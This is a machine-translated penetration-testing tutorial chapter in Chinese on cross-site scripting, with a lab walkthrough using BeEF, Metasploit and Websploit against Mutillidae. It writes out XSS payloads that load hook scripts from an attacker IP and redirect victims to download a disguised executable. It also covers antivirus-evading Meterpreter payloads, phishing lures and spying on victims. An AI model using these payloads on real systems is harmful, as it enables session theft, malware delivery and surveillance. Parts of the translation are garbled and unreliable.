# 六、通过跨站点脚本渗透会话

Web 应用黑客攻击属于自己的一类。与网络和系统相关的黑客攻击侧重于在这些系统上获得持久存在或以其他方式修改它们的状态，而 WebPen 测试则侧重于欺骗服务器、客户端或两者，让攻击者出价。当然，你可以尝试典当这些服务器或破坏客户机或浏览器，但如果你可以在不建立永久居留权的情况下从交易所获得你想要的一切，为什么不呢？注入攻击让许多 web 开发人员非常紧张，就像绝地武士在 web 应用中耍的把戏。只需挥动你的手（不是字面上的意思，它实际上只是在键盘上做一些努力），你就可以说服服务器、客户机或两者以他们不会以其他方式行事的方式行事。这样做可能是为了放弃数据（据信在 Impact 团队的 Ashley Madison 黑客攻击中发生了这种情况），或者用恶意脚本毒害一方或双方，这些脚本会破坏客户端和服务器之间的信任。

**跨站点脚本**（它可以缩写为**CSS**或**XSS**，但我们将使用后者以避免将此攻击与**级联样式表**混淆）可能是许多人在实践中或通过自动化工具测试过的东西，但这是一个非常深刻的话题，可以证明自己的书是正确的。作为广义注入攻击的一个子集，XSS 专注于在不应该使用 JavaScript 的地方使用 JavaScript。XSS 并没有广泛地操纵被劫持的请求和响应，而是在它们中找到了插入秘密脚本的机会，否则这些脚本将无法登陆和执行。这些脚本现在看起来对我们的目标和他们的用户是可信的，因为他们彼此信任，我们将使用这种信任关系来对付他们。

这些脚本的用途可能大不相同，但许多用途可能包括公开 cookie 和会话信息，允许重定向和 MITM 攻击，劫持一个或两个端点进行其他攻击，甚至促进敏感数据的过滤。这些特点使它们极其危险，尽管在过去几个周期中它们在 OWASP 前 10 名中排名很高，但它们仍然是一个主要问题。

XSS 有许多应用，但在本章中，我们将区分 XSS 的类型，并提供一些选项，说明如何在测试中最好地释放它们。虽然 Burp 和 ZAP 可以提供一些 XSS 漏洞利用，但了解如何制作自己的并使用 Kali 中提供的其他工具来帮助实现这些漏洞是很有帮助的。本章将讨论各种形式的 XSS，并展示我们可以使用这种强大的攻击形式来破坏目标的其他方式。

在本章中，您将学习以下内容：

*   讨论各种形式的 XSS，以及如何检测和利用其中的漏洞
*   探索**存储的**（也称为**持久的**）XSS 攻击是如何工作的，以及如何利用它们
*   使用社会工程技术理解和测试**反映的**XSS
*   讨论其他工具（如 BeEF、XSSer、Websploit 和 Metasploit）的功能，以及它们处理各种形式的 XSS 攻击的能力

## XSS 类型的底层

* * *

XSS 攻击既常见又可怕；在正确的位置，它们可以用来传递恶意脚本、将流量引导到替代重定向或植入错误数据。对他们进行分类的努力增加了我们中一些人的困惑。最早的分类侧重于它的持久性（或缺乏持久性），但随着时间的推移，业界一直关注受影响的主机：web 服务器或浏览客户端。OWASP 在重新定义这些类型方面做了大量工作，以帮助我们（笔测试人员）为每种类型选择最佳的检测方法和开发工具。将它们联系在一起的共同点是，它们都涉及到用户输入由服务器在未经适当验证的情况下转发，并且这些攻击总是在浏览器中执行，而不管传递方法如何。让我们回顾一下最新的分类，这样我们就可以有效地使用它们了。

### XSS 应该留下还是离开？

XSS 攻击，无论发生在何处，都可以存储或反射。根据意图和受影响会话的上下文，这两种情况的范围从恼人到严重：

*   存储的 XSS 攻击（持久）非常常见，来自伪装成合法用户的攻击者的数据在呈现给其他用户之前未被正确筛选。此代码将持续存在，继续影响用户，直到检测到它、清除数据或在 web 服务上实施预防措施，以确保正确验证包含代码的响应。实际上，代码存储在服务器本身中，如下所示：

![](https://www.packtpub.com/img/9781784395070/img/B03918_06_01-1.png)

存储的 XSS 将攻击查看请求页面的任何客户端。

*   反射性 XSS 攻击（也称为非 persistent）更为多样，因为它们可以通过网络钓鱼活动、社会工程、MITM 攻击或其他转移方式发起。无意中的用户通过单击包含脚本的恶意链接发起攻击。攻击者手工编写脚本，以便在受到攻击的 web 服务器的错误或搜索响应中返回或反映脚本。因为攻击者说服用户点击嵌入脚本的链接，他们知道这会反映在响应中；糟糕的客户端浏览器现在将信任该脚本，就像它起源于服务器本身一样。实际上，受害者的浏览器发起了请求，如以下屏幕截图所示：

![](https://www.packtpub.com/img/9781784395070/img/B03918_06_02-1.png)

反射式或非持久性 XSS 往往更关注于一组用户。

### 位置，位置，位置！

第二种区分 XSS 类型的方法是通过位置。根据连接的哪一端受到攻击，检测方法和防御对策可能会有很大不同：客户端或服务器：

*   服务器 XSS 攻击可能发生在服务器将恶意内容作为其对客户端请求的响应的一部分而交付时，因为当它最初由另一个客户端（通常是攻击主机）输入时未进行充分过滤或验证。这些攻击对客户端来说可能很困难，因为服务器将攻击与其 HTML 捆绑在一起，客户端浏览器无法区分服务器的修改行为，因此无法忠实地呈现服务器，同时信任预期的和植入的恶意代码。
*   另一方面，客户端 XSS 攻击的重点是在客户端自己的设施内传递的恶意代码或修改。到目前为止，最流行的形式是基于 DOM 的 XSS，它在浏览器中以页面的状态机为目标。大多数时候，当我们谈论客户端 XSS 时，我们指的是基于**DOM 的 XSS**。基于 DOM 的 XSS 攻击是客户端 XSS 的一个子集，它们利用了动态 web 应用设计。在大多数现代 web 应用中，浏览器在访问站点时会构建一个**文档对象模型**（**DOM**），该模型可以将 HTML 解析为树中的对象。这种解析允许脚本语言（大多数时候，我们在这里讨论 JavaScript，但其他 web 内容（如 HTML、ActiveX 和 Flash）动态修改表示树的 HTML 的内容。基于 DOM 的 XSS 攻击尤其令人不安，因为服务器可能永远不会在脚本中看到任何明显不好的东西。相反，服务器无意中通过引用受害者的本地变量来帮助攻击者，而不知道该变量是否有问题（如重定向、钩子文件等）。

### 注

应该注意，服务器端和客户端 XSS 攻击都可以是存储攻击或反射攻击。正如他们所说，大多数值得随身携带的工具应该能够帮助扫描和利用大多数种类。

### XSS 定位与交付

XSS 给 web 应用及其用户带来了可怕的威胁，但实现起来却非常简单。在大多数情况下，通过浏览器或电子邮件发送，攻击者所需要的只是 HTML 和 JavaScript 的工作知识，以及易受这种形式攻击的目标 web 服务器。利用这些技能，黑客可以选择他们愿意撒多大的网。我们必须警惕所有形式的注入攻击，包括 XSS，因为它们都可能在事件响应开始纠正这些问题之前很久就对应用造成严重破坏。

使用存储的 XSS，黑客会撒下一个大网，并用他们的恶意脚本影响大量用户。如果应用的潜在用户主要在范围内，这是很好的，而且攻击更直接，因为不需要社会工程来播种脚本。也就是说，正是由于这些原因，存储的 XS 必须节约使用。在报告哪些受害者方面没有选择，因此攻击者需要更多的开销来区分范围内和范围外的受害者。更广泛的潜在受众也对道德黑客的适用性提出了质疑，因为从受损主机捕获数据的可能性极高，客户可能会有需要解决的问题。这使得存储的或持久的 XSS 攻击对许多人非常有害。

反射式 XSS 非常值得提前付出努力，因为网络钓鱼活动、受污染的链接或其他交付方式更加精确，从而限制了附带损害。这也使黑客或测试人员能够专注于受影响的目标集，并实际上保证收集的数据是从感兴趣的用户处收集的。虽然对受害者的潜在伤害与存储的 XSS 攻击相当，但受害者是有意的，因此这使其更加安全，值得付出努力。

## 眼见为实

* * *

当向客户报告存在 web 应用漏洞时，大多数测试报告都会显示扫描，以确定漏洞存在的可能性（识别），但也会进一步证明漏洞利用是成功的（确认）。Arachni、ZAP、BurpSuite 和其他脆弱性评估工具可以帮助识别工作。其中一些工具可以帮助确认，但大多数测试人员将使用独立的 XSS 工具或方法来确认，以模拟黑客使用时的攻击行为。快速搜索您最喜欢的搜索引擎，会发现有一些领先的候选人，但我们将讨论最受欢迎的候选人，然后看看那些坚定的人如何让我们让我们的目标实现他们的目标。

### 不要与 XSSer 一起运行！

Kali 中用于 XSS 测试的最快速、最直接的工具之一是**XSSer**（有时发音为*剪刀*。作为一种工具，XSSer 提供一个功能，即测试 web 应用上是否存在潜在的 XSS 漏洞，并提供快速、无争议的验证 URL 字符串来对其进行检查。XSSer 是一种罕见的工具，它可以以最少的技术诀窍为您提供令人敬畏的功能；但如果有一只经验丰富的手，它可以精确地进行裁剪。

您可以将 XSSer 用作 CLI 工具或其 GUI 包装器，这是借助更直观的包装器构建 CLI 查询的好方法。要在 GUI 模式下使用 XSSer，只需在终端会话中键入以下内容：

```
xsser â��gtk
```

XSSer 是一个很好的工具，用于对网站运行基于警报的测试脚本，以确定其敏感性。话虽如此，我发现 XSSer 的上一个发布版本是在 2013 年发布的，比本文的撰写时间早了四年，也比 Metasploit 过去的一些修订版早。事实上，最新版本更适用于回溯，但仍然提供了一个有用的向导和一些教育价值。然而，针对特定的目标，我发现与当前的工具相比，它在应用中既有缺陷又有局限性。值得一看，但我建议专注于一些功能更全面的工具，如 BeEF 和 Metasploit。

### 与牛肉一起存放的 XSS

**浏览器开发框架**（**牛肉**，在[提供 http://beefproject.com](http://beefproject.com/) 是我们在*树莓 Pi 渗透测试第二版*（[中看到的一种工具 https://www.packtpub.com/networking-and-servers/penetration-testing-raspberry-pi-second-edition](https://www.packtpub.com/networking-and-servers/penetration-testing-raspberry-pi-second-edition) *在这里我们讨论了它作为蜜罐或恶意 web 服务器的一般用途。这些功能使 BeEF 成为交付和后续管理各种 XSS 攻击的绝佳工具。BeEF 的强大之处在于它利用互联网浏览器中的一个钩子脚本进行攻击，而且由于 web 服务器中存在 XSS 漏洞，它可以逃避更多偏执狂或训练有素的受害者使用的大多数控制。除了完全阻止各种 HTML 数据类型之外，由于攻击者利用了可信关系，一个配置完美的客户端仍然可以运行。*

 *在钩住受害者后，BeEF 能够评估浏览器和操作系统组合的固有漏洞。基于这些发现，BeEF 提供了一系列可以启动的命令模块，比如截图、抓取凭证或过滤 cookie，甚至触发嘟嘟声。钩住的系统只能在联机时访问。然而，一旦上钩，BeEF 可以跟踪系统何时建立 internet 连接以继续针对该系统启动命令。很滑，很吓人！

为了实际展示这一点并帮助理解存储 XSS 攻击的威力，我们将使用 BeEF hook 脚本并将客户端指向 Kali 机器的 BeEF 实例。以下屏幕截图显示了我们的测试场景，其中配置了以下内容：

*   **攻击者的机器**：Kali VM 正在运行一个 BeEF 服务器，监听所有接口（172.16.30.128 是外部 IP 地址）
*   **Web 服务器/应用**：OWASP BWA VM，特别是 Multillidae Web 应用
*   **客户端**：运行 Internet Explorer 10 的 Windows 7 虚拟机（评估副本）

攻击者可以从 Kali/BeEF 控制头端远程执行命令模块，同时被钩住的受害者继续使用互联网，通常不会注意到危害。在以下截图中所示的实际攻击或黑盒攻击中，黑客通常会部署云或 Kali 或类似机器的临时实例，并将其伪装成多层混淆（VPN、TOR、代理等）充当攻击机器，使目标服务器上的归属或检测更加困难。不管攻击机器的位置如何，在存储的 XSS 中，易受攻击的服务器将继续帮助我们钩住猎物。

![](https://www.packtpub.com/img/9781784395070/img/B03918_06_03-1.png)

我们的存储 XSS 场景与 BeEF

我们可以首先从 GUI 应用菜单**`Favorites`**栏启动 BeEF XSS，或者通过导航到 BeEF 目录（`cd /usr/share/beef-xss`，然后使用`./beef`运行`beef`脚本，从 CLI 启动 BeEF XSS。当它启动时，**`Terminal`**会话将向我们显示用户界面的通用 URL（`UI URL`为红色）和我们想要用来钩住猎物的脚本（`Hook`为蓝色），如下所示：

![](https://www.packtpub.com/img/9781784395070/img/B03918_06_04-1.png)

BeEF 的启动过程告诉我们如何管理实例以及如何连接浏览器。

BeEF 将自动启动浏览器会话，您可以使用*BeEF*的用户名和密码登录。当它第一次启动时，在线和离线浏览器列表将为空。我们将打开一个新选项卡，以访问攻击者的身份访问*Mutillidae Web 应用*，在该应用中，我们可以在可怜的受害者肯定会看到的字段中输入我们的钩子脚本（**`OWASP 2013`****`A3 - Cross Site Scripting (XSS)`****`Persistent (Second Order)`****`Add to your blog`**），如图所示：

![](https://www.packtpub.com/img/9781784395070/img/B03918_06_05-1.png)

Mutillidae 提供了一些可用于存储 XS 的模拟表单。

我们将看到一个博客条目表单，在该表单中，我们可以放下我们的钩子脚本（`<script src="http://172.16.30.128:3000/hook.js"></script>`，然后单击**`Save Blog Entry`**按钮（如以下截图所示）：

![](https://www.packtpub.com/img/9781784395070/img/B03918_06_06.png)

在 web 应用的博客功能上植入我们的钩子脚本。

好吧，让我们换个帽子，打开我们可怜的、毫无戒心的运行 IE 10 的 Windows 7 虚拟机！在 windows 虚拟机上，我们将以观察者的身份访问博客�� 这里没什么疯狂的。只需遵循**`OWASP 2013`****`A3 - Cross Site Scripting (XSS)`****`Persistent (Second Order)`****`View someone's blog`**的路径，如下图所示，我们希望看到所有用户的输入。该页面将向我们显示所有条目，包括匿名用户包含脚本的输入。我们知道博客页面是易受攻击的，因为我们在[第 5 章](Mastering%20Kali%20Linux%20for%20Web%20Penetration%20Testing_split_000.html#)、*使用 OWASP ZAP 和 BurpSuite*进行代理操作时发现了它，测试结果表明它可能具有 XSS 脚本漏洞（如下图所示）。在这里，我们知道服务器在从后续受害者的响应中重复这些条目之前，没有验证这些条目的内容。

![](https://www.packtpub.com/img/9781784395070/img/B03918_06_07.png)

从受害者站点浏览到受影响的博客。

一旦我们导航到 blog 视图（如下图所示），我们将看到一个空白区域，匿名用户显然没有输入任何内容。在这一点上，他们没有理由相信自己被黑客攻击或受到恶意 XSS 攻击。

![](https://www.packtpub.com/img/9781784395070/img/B03918_06_08-1.png)

所有这些浪费了的潜力（隐藏在脚本中）都存在于一个非常棒的博客中。

我们的卡利盒子知道其他情况；查看我们的 BeEF XSS 框架的控制 UI，我们可以看到运行 IE 10 的 Windows 7 框已经签入并正在报到。因为浏览器在宣布它们可以支持什么和不能支持什么方面非常有帮助，BeEF 非常了解我们可以对我们刚刚上钩的受害者实施什么样的黑客和技巧，在下面的屏幕截图中，我们看到我搜索了与*cookie*相关的命令，从中选择了**`Get Cookie`****`Module Tree`**的**`Browser`**部分**`Hooked Domain`**部分，并运行它以获取在受害者浏览器和 Mutillidae web 服务器之间使用的会话 cookie。除了证明存在 XSS 漏洞之外，我们还可以使用其他有用的攻击，这些攻击可以帮助我们获取社交媒体登录状态、已安装的软件、浏览历史记录，以及其他任何可以帮助我们更好地进行攻击的攻击重新划分目标环境。

![](https://www.packtpub.com/img/9781784395070/img/B03918_06_09.png)

近 200 个模块附带了 BeEF，帮助我们将浏览器变成我们的扩展！

请记住，我们来这里是为了对 web 应用进行笔式测试，而不是对用户和整个环境进行笔式测试。除非您也有一份类似于红色团队的章程，否则请避免提取任何 web 应用特定数据之外的任何内容。*  *### 这里，钓鱼！

反射的 XSS 攻击与此类似，只是用户被雇佣通过欺骗他们传递脚本来帮助自己进行黑客攻击。攻击者的网络钓鱼或链接放置取代了基于表单的攻击，确实需要一些工作。**钓鱼**包括向潜在目标发送*诱饵*电子邮件或网页，希望他们相信自己的意图并点击其中嵌入的恶意链接。网络钓鱼通常可用于其他攻击（简单重定向到网络钓鱼网站仍然很流行），但将目标垃圾邮件与使用合法网站（但恶意脚本）的重定向相结合可能会非常令人讨厌。这就是说，让我们来讨论一下攻击者和我们的测试员需要考虑的一些问题。

建立目标清单可能是劳动密集型的；事实上，目标名单是黑暗网络黑客网站上的一项流行服务。在笔试中，使用浏览器、Maltego 或社交媒体等工具的 OSIT 和社会工程可以节省时间，使我们能够利用收集到的信息帮助我们评估我们在找谁。在我们的测试中，IT 人员，即所谓的*C-suite*高管（特别是**首席信息官**（**CIO**）、**首席信息安全官**（**CISO**）以及任何其他与安全相关的技术人员，应考虑现场的操作、架构或应用开发。

### 注

俄罗斯黑客针对[进行的大规模黑客攻击 https://in.yahoo.com/?p=us](https://in.yahoo.com/?p=us) 2014 年[https://www.justice.gov/opa/press-release/file/948201/download](https://www.justice.gov/opa/press-release/file/948201/download) ）通常从针对已知员工的小范围网络钓鱼活动开始，以及他们收到电子邮件的可信原因。在这种情况下，这些信息被用来帮助伪造 cookies 和窃取超过 5 亿个帐户的访问权限。这对我们许多人来说都不是一件有趣的事。

然后，攻击者将需要一个自愿的邮件中继或服务器，以允许将诱饵大量邮寄到其预期目标。坏人会使用一些出租服务（例如，Send Safe 等臭名昭著的垃圾邮件网站），或者他们可能会选择在合法的基础设施上部署垃圾邮件，或者更糟糕的是，破坏 web 服务器，将其转变为基于 PHP 的电子邮件服务器或网关。最后一种方法尤其邪恶，因为如果他们能够破坏目标公司的网络邮件服务，他们就可以像完全合法一样运作。

现在，我们只需要诱饵！基于网络钓鱼的链接传递有助于限制不必要的目标捕获，与其他引诱反射 XS 的方法（如蜜罐网站和 MITM）相比，更容易在没有归因和附带损害的情况下转移（使用 SET 等工具，见[第 3 章](Mastering%20Kali%20Linux%20for%20Web%20Penetration%20Testing_split_000.html#)*【通过目标侦察跟踪猎物】。*下面的屏幕截图显示了一个示例：

![](https://www.packtpub.com/img/9781784395070/img/B03918_06_10.png)

钓鱼诱饵样本，用于测试员工。这里的每一个环节都可能受到污染。

### 注

超链接、图形、页面或电子邮件中的任何互动内容都可能是一个有用的诱饵，当攻击特定的人或团队时，您在社交媒体上的努力将对您的成功率产生巨大影响。

### 我们去看电影吧

到目前为止，我们在本书中使用的许多工具都集中在 web 应用上，并且已经证明在评估网站中可能存在的漏洞时非常方便。在所有 pen 测试领域中使用的更通用的工具之一，Metasploit（[https://www.metasploit.com](https://www.metasploit.com) ），实际上在测试包括 XSS 在内的许多顶级 web 应用 Vuln 时提供了一些很好的价值。Metasploit 可能不需要引入；您很可能将其作为工作流程或方法的重要组成部分。这就是说，它是一个包含各种可扩展侦察和扫描模块的框架，用于填充主机和相应 VULN 的数据库。该数据库允许 Metasploit 进入开发阶段，在该阶段，可以主动启动开发，或者在某些情况下将开发捆绑到有效负载中，以进行基于文件的交付。围绕 Metasploit 的社区非常活跃，事实上，已有数百个插件和模块被精心设计，使 Metasploit 成为每个人最喜爱的基础笔测试工具。

#### 构建自己的有效载荷

使用 BeEF，甚至在设备上的标准 web 服务器设施中，您可以使用 Metasploit 的**MeterMeter**功能来帮助您获得对受影响主机的 shell 访问。MeterMeter 是一种有效载荷元 Sploit，可将其交付到在**动态链接库**（**DLL**中工作的客户端，以在黑客和目标之间建立安全、隐蔽的通信通道；它为黑客提供了一个基于 Ruby 的 shell 给目标，然后可以使用该 shell 执行黑客的命令。我们为什么想要这个？在攻击 web 应用时，通过客户端环境的横向移动确实可以帮助我们站稳脚跟，危害受信任的主机，并找到可用于运行补充任务的相邻服务器，如邮件服务器、域控制器等。反射式 XSS 攻击是交付此脚本的一种很好的方法。如今，用户对附件相当谨慎（当然花了他们足够长的时间！），因此，将钩子文件和有效负载滑入一个不可见的脚本，为我们提供了一个访问训练有素的受害者计算机的好方法。

为此，我们将创建一个有效负载，对其进行编码，使其绕过传统的安全防御，将其托管在我们控制的服务器上，然后为 XSS 编写一个脚本，如下面的屏幕截图所示。同样的社会工程方法在这里也适用，但这给了我们另一种方法，我们可以通过它来妥协主人。浏览器控件很好，但是 shell 访问更好！

![](https://www.packtpub.com/img/9781784395070/img/B03918_06_11-1.png)

我们可以使用 Metasploit 作为 C2 前端，甚至可以定制有效载荷。

我们首先启动 Metasploit 框架的**msfconsole**并选择所选的有效负载，在本例中，它是 MeterMeter 反向 TCP 有效负载。我们可以通过在`msf`提示符中输入`use payload/windows/shell/reverse_tcp`命令来完成此操作。一个**`quick show`**选项将帮助我们看到我们可以配置什么，如下面的屏幕截图所示。与一般攻击一样，我们可以使用`show options`在下面的屏幕截图中看到有效负载的选项，并使用`-h`查看命令，以指导我们完成整个操作：

![](https://www.packtpub.com/img/9781784395070/img/B03918_06_12.png)

有效负载创建的初始阶段�� 设置选项。。

Metasploit 可以为攻击生成不同的文件格式。它还可以确保不使用某些字节（`x00`是一个普遍不可接受的字节，因此我们将把它拔出）。有效负载工具还可以执行以下操作：

*   它可以填充或附加额外字节（`-s`添加 NOP 幻灯片）
*   它可以使用不同于默认 Ruby 的编程语言（例如`-t java`或`â��t c`）
*   它可以应用编码器（显示编码器以查看它们，`-e <encoder>`更改编码器）
*   它可以在多个过程中进行迭代和编码（`-I <number of iterations>`

所有这些都有助于 Metasploit 隐藏和隐藏有效负载，从而成功规避典型的基于签名的反病毒程序。看到这是多么容易，人们就可以理解为什么传统的防病毒产品无法抵御这些新的、变形的威胁。

### 注

特征码检测寻找攻击中的特定特征。如果发现攻击无效，请尝试以另一种方式对其进行编码，然后再次发送。在许多情况下，添加足够的填充、调整或其他操作将绕过检测，因为现在它看起来像一个新文件。其他技术包括将文件分解成更小的文件或加密。

我们有大量的选择来修改和定制我们自己的有效载荷。现在，让我们省略`x00`字节，迭代 3 次，并将其导出到可执行文件中供我们使用，如下面的屏幕截图所示。

![](https://www.packtpub.com/img/9781784395070/img/B03918_06_13.png)

Metasploit 有效负载生成可以自定义代码，这些代码将通过实践绕过任何内容。

在我们的桌面上，我们现在有一个崭新的**.exe**，它将登陆 Windows 平台并执行。这就是社会工程发挥作用的地方，这意味着我们可以将此可执行文件命名为用户希望安装的文件，并将其包含在社会工程活动中。如果我们能说服一个 Windows 用户安装它，我们将被授予一个后门，允许 root 用户访问该系统，假设一切都按预期运行。这个概念对于本章后面介绍的其他攻击示例非常有用，我们的自定义恶意软件负载可以攻击这些示例。

### 注

我们选择的交付方式是故意平淡无奇的，这取决于对您的预期目标的限制，您可能不得不放弃整洁的可执行方法，转而选择更隐蔽的路径，例如 Java 或 Python 脚本，以某种方式避免启动 Windows**用户访问控制**（**UAC**）或其他可能到位的监管机构。我也在 msfconsole 视图中实现了这一切，这也是我花费更多时间的地方。如果您发现您有意启动 Metasploit 来创建有效负载，您可以选择使用**msfvenom**。

#### 每一个好的有效载荷都需要一个处理器

在执行时，我们的负载需要有一些东西可以交谈，以防它变得孤独或难以控制。在 Metasploit 中，该函数由**处理程序**提供。我们可以简单地为我们交付的有效负载类型创建一个处理程序，这样做可以确保当我们获得对系统的访问时，我们就在那里并且能够在它发生时利用它。处理程序充当我们与目标的**命令和控制**（**C2**或**C&C**连接），并向我们展示可以用来操纵目标而不受惩罚的外壳环境（如以下屏幕截图所示）：

![](https://www.packtpub.com/img/9781784395070/img/B03918_06_14-1.png)

为我们的有效载荷设置处理程序。

通过一个快速的`exploit`命令，我们现在正在运行并准备接受来自新受害者的流量。现在，处理程序已经准备好，您的目标已经确定；这两个孩子应该见面！现在，如果我有办法让用户信任我的文件就好了�¦

#### 敲定交易——�� 提供 shell 访问

让我们将我们的可执行文件放在 Kali VM 上一个快速脏的 Apache web 服务器的默认文件夹中，并编写一个脚本发送给潜在目标，以提供一个反映的 XSS JavaScript，现在它指向受害者的浏览器下载可执行文件。

这就是它看起来的样子：

```
http://172.16.30.129/mutillidae/index.php?page=user-info.php&username= <script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");  AllLinks[0].href = "http://172.16.30.128/updater.exe"; }</script>
```

当我们将其放入一封快速且肮脏的电子邮件（发送到我的 Windows 7 VM 和 IE 9）中时，我们可以假设用户有超过 50%的机会看到`updater.exe`文件名，将其与我的可信 web 应用关联，并执行它。在我们的卡利终端会议上，我们看到这一进展，我们得到了一个好消息，他们已经见面，现在正在联系！MeterMeter 现在充当提示，一个快速的`dir`命令向我们显示正在运行的目录的内容（如下面的屏幕截图所示）；但是我们能从这里做什么呢？

![](https://www.packtpub.com/img/9781784395070/img/B03918_06_15-1.png)

恭喜，我们现在可以远程访问 shell 了！

计量器是非常强大的东西；通过此访问，您现在可以在受害者不知情的情况下管理受害者的计算机。以下是一些在我们的 web app 笔测试中有用的东西：

*   转储哈希并操纵或窃取 cookie
*   秘密或公开使用系统网络摄像头和麦克风
*   进行键记录
*   上载、下载、编辑、删除、创建、移动和搜索文件和目录
*   终止或生成进程、修改注册表或关闭/重新启动/休眠计算机
*   请参阅网络和代理配置以及配置端口转发
*   查看系统和用户信息并升级权限

总而言之，这是一些可怕的东西，应该清楚地认识到，web 应用有责任确保它们不会将用户置于这种情况下。

如果我们遇到更新的浏览器或防御更严密的主机，这种简单的基于 exe 的攻击可能不会有多大进展。通过一些更先进的 Metasploit 功能、创造性的有效负载，甚至是无文件攻击的实践使用，这些防御措施可以，而且常常是规避的。

### Metasploit 专注于网络的表亲�� Websploit

Metasploit 在扫描和利用功能方面的范围是惊人的，通过插件和模块的开放扩展，它以多功能性和强大功能赢得了良好的声誉。然而，有时候，您正在寻找一个 web 应用焦点，而这正是一个类似的开源框架，名为**Websploit**（[）https://sourceforge.net/p/websploit/wiki/Home/](https://sourceforge.net/p/websploit/wiki/Home/) 开始发挥作用。与 Metasploit 一样，它提供了一种以命令行为中心的方法来调用和加载模块。它还通过插件和模块共享可扩展性，这些插件和模块帮助 Metasploit 保持了 pen 测试工具的领先地位，但它不是一个包罗万象的套件，而是专注于我们作为 web 渗透测试人员和道德黑客角色所特有的许多漏洞。

Wiki 上的模块和插件列表是其用途的一大赠品：

*   **Autopwn**：这是从 Metasploit 借来的，用于扫描和利用目标服务/服务器
*   **wmap**：可以扫描或抓取从 Metasploit`wmap`插件借用的目标
*   **格式感染器**：将反向和绑定有效负载注入到文件格式中
*   **Phpmyadmin**：搜索目标`phpmyadmin`登录页面
*   **lfi**：可以扫描并绕过本地文件包含漏洞，绕过一些 WAF
*   Apache 用户：这可以搜索服务器用户名目录（与 Apache web 服务器一起使用时）
*   **Dir Bruter**：使用单词列表对目标目录进行暴力攻击
*   **管理员查找器**：搜索目标的管理员和登录页面
*   Mulm 攻击：Ty1T:：中间人，XSS 钓鱼攻击
*   男性中间攻击
*   **Java 小程序攻击**：Java 签名小程序攻击
*   Mood 攻击向量 AUT1：末梢攻击向量中指
*   **USB 感染攻击**：创建可执行后门感染 Windows 版 USB
*   **ARP DOS**：随机 MAC 的 ARP 缓存拒绝服务攻击
*   **网络杀手攻击**：在网络上关闭您的网站（TCPKILL）
*   **虚假更新攻击**：这会为目标操作系统创建虚假更新页面
*   **假接入点攻击**：这可以创建假 AP 并嗅探受害者信息

由于这一章都是关于 XSS 的，基于 DOM 的 To.T0.左边的中间人 To1 T1（MultT2A.MLITM TA3T.T）攻击是我们正在使用的工具，所以让我们来看看我们如何利用该模块。您需要下载最新版本，从 tarball 中提取它，然后使用安装脚本。

一旦我们安装了它，我们只需从终端会话调用`websploit`命令，它就会启动它。从这里开始，我们将使用 network/mlitm。随着模块的发展，你不会比 MLIMM 工具更简单。你没有选择的余地，因为这个模块基本上由一个侦听 Web 服务器（类似于一个处理程序）和一个 Python 模块（AuthT1）组成，它充当默认的有效负载。但与任何 XSS 攻击一样，我们的目标是在用户信任的路径中放置一个脚本，然后使用它将其浏览器重定向到攻击服务器，在那里可以安装此负载，并协调信息或操作。

我在这次攻击中使用的脚本非常简单；我们希望将受害者浏览器引入我们的 C2 服务器/攻击箱，并允许运行在默认端口`8000`上的 webserver Websploit 为此目的交付有效负载并建立我们的通道：1

```
<script src=http://172.16.30.128:8000></script>
```

我们将其放在以前使用过的同一博客条目字段中，在您知道之前，我们有一个不幸的受害者出现并使用该链接（如以下屏幕截图所示）：

![](https://www.packtpub.com/img/9781784395070/img/B03918_06_16-1.png)

脚本条目和对受害者的外观�� 简单但有效。

在我们的 Kali 框中，我们可以看到我们正在交付有效负载，并通过引用链接看到用户的流量，正如我们在下面的屏幕截图中开始看到的那样。从这里，您可以自由地试验有效负载的改变，并实现我们在其他工具中看到的一些控制。

![](https://www.packtpub.com/img/9781784395070/img/B03918_06_17-1.png)

Websploit 提供了一种无需任何修饰的监听和有效载荷传递服务。

Websploit 在攻击链的其他领域是一个强大的工具，它与混合攻击模块（如 AutoWn、DoS）及其 WiFi 攻击配合得很好。对于 XSS，我发现 Metasploit 在管理有效负载和提供 shell 选项方面提供了更多的通用性。除了 MeterMeter 之外，还有十几种其他的外壳选择，这取决于你的目标可以逃脱什么，以及需要什么样的隐身和功能组合。*  *## 总结

* * *

自从动态内容的爆炸将 JavaScript 带入 web 开发的前沿以来，XSS 攻击一直是安全专业人员和数百万受害者的眼中钉。再加上建立信任的过时手段（基于实体，没有输入验证），这使得 XSS 成为 OWASP 十大漏洞已经超过 10 年。很明显，应该采取一些措施来引起更多的关注，而笔式测试的使用增加才是关键。

XSS 的工具很多，虽然我们讨论了这里包含的一些更易访问的工具，但在准备编写本章时，我发现这些工具集经历了一些起伏；随着时间的推移，一些工具已不再受欢迎，而另一些工具似乎仍在继续竞争�� Rapid7 是维护和赞助 Metasploit 的关键角色，而 XSSer 和 Websploit 都偶尔得到支持。我鼓励您尽可能深入研究这些工具和其他工具，以便更好地了解哪些工具应该放在您的工具箱中。明智的做法是，每个角色至少有两个工具，具有不同的优势和重叠能力，以帮助更好地覆盖角落案例场景。

在本章中，我们介绍了 XS 的类型，它们在我们追求*pwnership*（黑客说可以随意破坏网站或目标）*、*的过程中对我们造成伤害或帮助的可能性，以及一些利用它们来了解客户机及其与服务器关系的好方法。我们还看到，XSS 可以为真正的黑帽攻击者提供一个险恶的立足点，使他们能够操纵系统资源并监视受害者。XSS 的重点是利用客户机-服务器之间的信任关系来危害客户机，我们下一章将讨论客户端攻击以及如何利用相同的信任关系来控制或强制服务器本身。这些攻击被广泛称为注入攻击，并涵盖了 web 应用安全领域的一些热门话题，如 HTML、SQL、XML，甚至经常被忽视的 LDAP。在下一章结束时，您将有一个坚实的攻击基础，以帮助在大多数应用和客户中找到关键数据泄露和主机控制用户。我很高兴你能坚持到这一步，让我们看看我们能造成或防止什么进一步的损害！*